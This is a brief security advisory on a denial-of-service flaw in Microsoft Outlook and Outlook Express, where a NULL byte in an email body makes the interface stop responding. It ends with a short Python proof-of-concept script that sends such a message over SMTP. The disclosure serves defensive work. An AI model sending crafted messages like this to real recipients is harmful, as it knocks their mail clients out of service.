source: http://www.securityfocus.com/bid/10144/info

Microsoft Outlook and Outlook Express have been reported prone to a remote denial of service vulnerability. The issue is reported to present itself when a NULL is encountered in the message body of an e-mail.

It is reported that when the vulnerable software encounters a malicious e-mail as described above, the GUI will cease to respond.

A remote attacker may potentially exploit this condition to deny service to Microsoft Outlook and Outlook Express users.

import smtplib
from_address = "nobody@example.com"
to_address = "nobody@example.com"
message = "Before\r\n\000\r\nAfter"
smtp = smtplib.SMTP("localhost")
smtp.set_debuglevel(1)
smtp.sendmail(from_address, [to_address], message)
smtp.quit()